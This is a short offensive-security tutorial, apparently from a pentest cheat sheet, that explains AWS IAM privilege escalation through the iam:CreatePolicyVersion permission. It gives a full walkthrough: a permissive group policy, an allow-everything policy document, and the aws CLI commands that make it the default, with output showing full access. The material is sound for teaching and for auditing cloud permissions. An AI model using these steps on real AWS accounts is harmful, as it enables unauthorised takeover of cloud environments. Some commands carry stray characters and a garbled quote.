
- https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws
- https://github.com/andresriancho/enumerate-iam
- https://github.com/toniblyx/my-arsenal-of-aws-security-tools

## Creating new policy version
 
Users with the `iam:CreatePolicyVersion` permission are allowed to create a new version of an existing policy. 
Consequently, they can create a policy that allows more permissions than what they currently have.

The user needs to have this permission for a resource that applies to them. 
This only works if they can change a policy that affects them (e.g., through a group or a role).

### Example 
Our user is part of only a single group and has no other permissions assigned to them. 
The policy applied to the group allows only iam:CreatePolicyVersion, but it allows this permission on any resource:

```json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "PrivEsc1",
           "Effect": "Allow",
           "Action": "iam:CreatePolicyVersion",
           "Resource": "arn:aws:iam::*:policy/*"
        }
     ]
}
```

To escalate privileges, the user creates a new policy document that permits all AWS actions:

```bash
$ cat admin_policy.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
    ]
 }
```

The user then issues the aws command to create a new version of the policy that is applied to their group.

```bash
$ aws iam create-policy-version --policy-arn arn:aws:iam::[ACCOUNT-ID]:policy/privesc1 --policy-document file://admin_policy.json --set-as-default --profile privesc}

{
	"PolicyVersion": {
    	"CreateDate": "2019-03-06T20:56:41Z",
        "VersionId": "v2",
        "IsDefaultVersion": true
 	}
}
```
 
The result is that the user now has full AWS permissions:

```bash
$ aws iam get-policy-version --policy-arn arn:aws:iam:: [ACCOUNT-ID]:policy/privesc1 --version-id v2}

{
 	"PolicyVersion": {
		 "CreateDate": "2019-03-06T20:56:41Z",
         "VersionId": "v2",
         "Document": {
         	"Versionâ€ť: "2012-10-17",
            "Statement": [
            	{
                	"Action": "*",
                    "Resource": "*",
                    "Effect": "Allow",
                    "Sid": "AllowEverything"
 				}
			 ]
 		},
		"IsDefaultVersion": true
	 }
}
```